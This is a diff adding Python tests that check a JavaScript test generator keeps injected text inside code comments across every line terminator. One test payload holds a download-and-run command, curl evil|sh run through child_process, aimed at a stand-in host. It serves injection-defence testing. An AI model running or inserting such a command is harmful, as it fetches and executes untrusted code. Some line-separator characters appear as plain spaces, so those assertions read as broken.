@@ -54,6 +54,39 @@ def test_locators_render_the_way_a_developer_would_write_them(desc, expected) ->
     assert render_locator(desc) == expected
 
 
+_JS_LINE_BREAKS = ("\r\n", "\n", "\r", " ", " ")
+
+
+def _js_lines(code: str) -> list[str]:
+    """Split source the way a JavaScript parser does: on every line terminator."""
+    for terminator in _JS_LINE_BREAKS[1:]:
+        code = code.replace(terminator, "\n")
+    return code.split("\n")
+
+
+@pytest.mark.parametrize("line_break", ["\n", "\r", " ", " "])
+def test_text_in_comments_cannot_break_out_and_become_code(line_break: str) -> None:
+    payload = f"harmless{line_break}require('child_process').exec('curl evil|sh')//"
+    todo_step = TestAction("act-1", "fill", LOGIN, LOGIN, f"“{payload}” into Name", "x", None)
+    test = build_test(
+        title="t",
+        start_url=LOGIN,
+        actions=[todo_step],
+        expectation=Expectation(type="none", description=payload),
+        status="unverified",
+        note="",
+    )
+    for line in _js_lines(test.code):
+        if "child_process" in line:
+            assert line.lstrip().startswith("//"), f"escaped its comment: {line!r}"
+
+
+def test_literals_escape_the_line_breaks_json_leaves_raw() -> None:
+    literal = js("a b c")
+    assert " " not in literal and " " not in literal
+    assert json.loads(literal) == "a b c"
+
+
 def test_an_element_without_a_unique_locator_becomes_a_todo_not_a_guess() -> None:
     action = TestAction("act-2", "click", LOGIN, LOGIN, "Mystery", "", None)
     assert action.code().startswith("// TODO: click")
